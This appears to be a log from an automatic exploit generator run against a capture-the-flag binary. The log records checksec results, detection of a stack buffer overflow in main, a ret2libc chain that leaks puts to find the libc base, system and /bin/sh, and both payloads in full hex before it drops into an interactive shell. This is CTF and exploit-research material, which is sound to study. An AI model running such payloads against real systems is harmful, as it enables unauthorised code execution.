@@ -1,0 +1,68 @@
+[*] '/home/user/bof_aeg/challenges/h@cktivityctf2021_retcheck'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] libc.so.6 found in custom_lib_dir, loading now
+[*] '/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] PT_INTERP has changed from b'/lib64/ld-linux-x86-64.so.2\x00' to b'/tmp/ld.so.2'. Using temp file /tmp/pwn/h@cktivityctf2021_retcheck_debug
+[*] '/tmp/pwn/h@cktivityctf2021_retcheck_debug'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] set env={'LD_PRELOAD': '/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6', 'LD_LIBRARY_PATH': '/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/'} for debugging remote libc
+[x] Starting local process '/tmp/pwn/h@cktivityctf2021_retcheck_debug' env={b'LD_PRELOAD': b'/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6', b'LD_LIBRARY_PATH': b'/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/'} 
+[+] Starting local process '/tmp/pwn/h@cktivityctf2021_retcheck_debug' env={b'LD_PRELOAD': b'/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6', b'LD_LIBRARY_PATH': b'/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/'} : pid 10705
+[*] Finding win...
+[*] Testing flag block address :0x4012e9...
+[*] No win found!
+[*] Finding stack bof...
+[*] Found vulnerable state.
+[*] Vuln_addr: 0x40146b
+[*] Vuln_func(main): 0x401453
+[*] Trying tech{ret_to_libc}...
+[*] Loading gadgets for '/home/user/bof_aeg/challenges/h@cktivityctf2021_retcheck'
+[*] Found leak_got :puts
+[DEBUG] Sent 0x200 bytes:
+    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+    *
+    00000190  00 00 00 00  00 00 00 00  65 14 40 00  00 00 00 00  │····│····│e·@·│····│
+    000001a0  00 00 00 00  00 00 00 00  d4 14 40 00  00 00 00 00  │····│····│··@·│····│
+    000001b0  d3 14 40 00  00 00 00 00  98 3f 40 00  00 00 00 00  │··@·│····│·?@·│····│
+    000001c0  24 11 40 00  00 00 00 00  53 14 40 00  00 00 00 00  │$·@·│····│S·@·│····│
+    000001d0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+    *
+    000001f0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 0a  │····│····│····│····│
+    00000200
+[DEBUG] Received 0x14 bytes:
+    b'retcheck enabled !!\n'
+[DEBUG] Received 0x1b bytes:
+    00000000  d0 a5 79 3c  25 7f 0a 72  65 74 63 68  65 63 6b 20  │··y<│%··r│etch│eck │
+    00000010  65 6e 61 62  6c 65 64 20  21 21 0a                  │enab│led │!!·│
+    0000001b
+[*] leak_addr: 0x7f253c79a5d0
+[*] libc_base: 0x7f253c72b000
+[*] system_addr: 0x7f253c770380
+[*] binsh_addr: 0x7f253c8b758b
+[DEBUG] Sent 0x201 bytes:
+    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+    *
+    00000190  00 00 00 00  00 00 00 00  65 14 40 00  00 00 00 00  │····│····│e·@·│····│
+    000001a0  00 00 00 00  00 00 00 00  d3 14 40 00  00 00 00 00  │····│····│··@·│····│
+    000001b0  8b 75 8b 3c  25 7f 00 00  80 03 77 3c  25 7f 00 00  │·u·<│%···│··w<│%···│
+    000001c0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+    *
+    000001f0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 0a  │····│····│····│····│
+    00000200  0a                                                  │·│
+    00000201
+[*] Switching to interactive mode
+
+retcheck enabled !!
